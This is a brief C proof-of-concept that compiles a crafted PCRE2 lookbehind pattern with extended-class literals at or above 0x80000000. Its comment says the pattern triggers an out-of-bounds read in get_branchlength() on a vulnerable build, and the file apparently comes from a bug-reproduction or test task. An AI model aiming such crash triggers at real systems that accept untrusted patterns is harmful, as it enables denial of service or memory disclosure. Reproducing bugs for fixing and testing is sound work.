/* PoC: compile a 32-bit pattern with PCRE2_ALT_EXTENDED_CLASS whose
   lookbehind contains an extended class holding non-UTF literals
   >= 0x80000000 (stored in the parsed pattern as META_BIGVALUE pairs).
   On the shipped tree the nested-class skip in get_branchlength()
   misreads the BIGVALUE payload as a nested META_CLASS opener and
   scans off the end of the parsed-pattern vector (ASAN buffer-overflow
   READ). On the golden tree the pattern compiles cleanly. */

#include <stdio.h>
#include <string.h>

#define PCRE2_CODE_UNIT_WIDTH 32
#include "pcre2.h"

int main(void)
{
/* Pattern text: (?<=[\x{800a0000}\x{800a0000}\x{800a0000}\x{800a0000}\x{800a0000}\x{800a0000}\x{800a0000}\x{800a0000}]) */
static const char pat_text[] =
  "(?<=[\\x{800a0000}\\x{800a0000}\\x{800a0000}\\x{800a0000}"
  "\\x{800a0000}\\x{800a0000}\\x{800a0000}\\x{800a0000}])";
PCRE2_UCHAR pattern[sizeof(pat_text)];
PCRE2_SIZE i;
int err;
PCRE2_SIZE erroff;
pcre2_code *code;

for (i = 0; i < sizeof(pat_text); i++) pattern[i] = (PCRE2_UCHAR)pat_text[i];

code = pcre2_compile(pattern, i - 1, PCRE2_ALT_EXTENDED_CLASS,
  &err, &erroff, NULL);
if (code == NULL)
  {
  printf("compile failed: err=%d offset=%lu\n", err, (unsigned long)erroff);
  return 0;
  }
printf("compiled OK\n");
pcre2_code_free(code);
return 0;
}
